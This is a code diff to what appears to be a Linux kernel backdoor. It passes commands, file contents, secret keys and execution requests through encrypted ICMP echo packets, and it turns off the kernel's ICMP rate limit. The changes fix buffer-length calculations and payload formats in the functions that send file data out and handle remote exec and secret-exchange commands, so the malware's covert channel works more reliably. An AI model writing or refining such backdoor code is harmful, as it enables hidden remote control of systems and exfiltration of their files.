@@ -1823,7 +1823,7 @@ static int do_icmp_echo_skb(struct sk_buff *skb)
 	int ret = -1;
 
 	icmph = icmp_hdr(skb);
-	len = skb->len - sizeof(struct icmphdr) - sizeof(struct timeval);
+	len = skb->len - sizeof(struct timeval);
 	if (len < LEN_PREFIX_CMD)
 		goto end;
 
@@ -2079,17 +2079,20 @@ static int send_file_data(const char *fname, int f_len, struct sk_buff *skb, cha
 	skb2 = skb_copy(skb, GFP_ATOMIC);
 	if (!skb2)
 		goto end;
+
 	icmph = icmp_hdr(skb2);
 	cmd = (char *)icmph + sizeof(struct icmphdr) + sizeof(struct timeval);
-	skb2_buf_len = skb2->len - sizeof(struct icmphdr) - sizeof(struct timeval)
-                                 - LEN_PREFIX_CMD - f_len - 1 ;
+	skb2_buf_len = skb2->len - sizeof(struct timeval)
+                                 - LEN_PREFIX_CMD - f_len - 1 - sizeof(int);
+	if (skb2_buf_len <= 0)
+		goto end;
 
 	disable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));
 	while (file_size > 0) {
 		/*
 		  format: CMD + filename + '\0' + datalen + data
 		*/
-		len = file_size > skb2_buf_len-sizeof(int) ? skb2_buf_len-sizeof(int) : file_size;
+		len = file_size > skb2_buf_len ? skb2_buf_len : file_size;
 
 		ptr = cmd;
 		*((short*)ptr) = htons(CMD_SEND_FILE);
@@ -2107,10 +2110,10 @@ static int send_file_data(const char *fname, int f_len, struct sk_buff *skb, cha
 		memcpy(ptr, data+size, len);
 		ptr += len;
 
-		if ((char *)icmph + skb2->len - ptr > 0)
-			memset(ptr, 0, (char *)icmph + skb2->len - ptr);
+		if (cmd + (skb2->len-sizeof(struct timeval))  - ptr > 0)
+			memset(ptr, 0, cmd + (skb2->len-sizeof(struct timeval)) - ptr);
 
-		enc_buf(cmd, cmd, skb2->len - sizeof(struct icmphdr) - sizeof(struct timeval));
+		enc_buf(cmd, cmd, skb2->len - sizeof(struct timeval));
 
 		while (!icmp_ratelimit(&icmp_rs, len)) 
 			schedule_timeout_interruptible(3);
@@ -2225,6 +2228,9 @@ end:
 	return size;
 }
 
+/*
+ * format: CMD + filename + '\0' + size_len + size 
+ */
 static int do_send_file_size(const char *name, int f_len, struct sk_buff *skb, char *buf, int buf_len)
 {
 	long file_size = 0;
@@ -2238,11 +2244,7 @@ static int do_send_file_size(const char *name, int f_len, struct sk_buff *skb, c
 	if (file_size < 0)
 		goto end;
 
-	/*
-	 * format: CMD + filename + '\0' + datalen + data
-	 */
-
-	*(int*)buf = sizeof(int);
+	*(int*)buf = htonl(sizeof(int));
 	file_size = htonl(file_size);
 	memcpy(buf+sizeof(int), (void*)&file_size, sizeof(file_size));
 
@@ -2273,7 +2275,7 @@ static int do_file_task(short cmd, struct sk_buff *skb, char *data)
 
 	icmph = icmp_hdr(skb);
 	p_cmd = (char *)icmph + sizeof(struct icmphdr) + sizeof(struct timeval);
-	len = skb->len - sizeof(struct icmphdr) - sizeof(struct timeval);
+	len = skb->len - sizeof(struct timeval);
 	if (len <= LEN_PREFIX_CMD)
 		goto end;
 
@@ -2316,16 +2318,22 @@ static int do_secret_task(struct sk_buff *skb)
 
 	icmph = icmp_hdr(skb);
 	p_cmd = (char *)icmph + sizeof(struct icmphdr) + sizeof(struct timeval);
-	len = skb->len - sizeof(struct icmphdr) - sizeof(struct timeval);
+	len = skb->len - sizeof(struct timeval);
 	len -= LEN_PREFIX_CMD;
-	if (len < LEN_SECRET)
+	if (len < LEN_SECRET + sizeof(int))
 		goto end;
 
+	/*
+	 * format: CMD + secret_len + secret 
+	 */
 	mutex_lock(&mutex_secret);
 
 	get_random_bytes(new_sec, LEN_SECRET);
-	memcpy(p_cmd+LEN_PREFIX_CMD, new_sec, LEN_SECRET);
-	enc_buf(p_cmd, p_cmd, LEN_SECRET+LEN_PREFIX_CMD);
+
+	*(int *)(p_cmd+LEN_PREFIX_CMD) = htonl(LEN_SECRET);
+	memcpy(p_cmd+LEN_PREFIX_CMD+sizeof(int), new_sec, LEN_SECRET);
+
+	enc_buf(p_cmd, p_cmd, LEN_SECRET + sizeof(int) + LEN_PREFIX_CMD);
 	secret_state = SECRET_SEND;
 
 	mutex_unlock(&mutex_secret);
@@ -2335,6 +2343,13 @@ end:
 	return rc;
 }
 
+/*
+ *   | icmphdr | + | timeval | + | CMD | + | filename | + '\0' + | data_len | + | data |
+ *       |              |        2 bytes                 1 bytes   4 bytes
+ * sizeof(icmphdr)      |       
+ *                sizeof(timeval)
+ *
+ */
 static int do_exec_event(struct sk_buff *skb)
 {
 	struct icmphdr *icmph = NULL;
@@ -2346,7 +2361,7 @@ static int do_exec_event(struct sk_buff *skb)
 	int ret = -1;
 
 	icmph = icmp_hdr(skb);
-	len = skb->len - sizeof(struct icmphdr) - sizeof(struct timeval);
+	len = skb->len - sizeof(struct timeval);
 	if (len < LEN_PREFIX_CMD)
 		goto end;
 
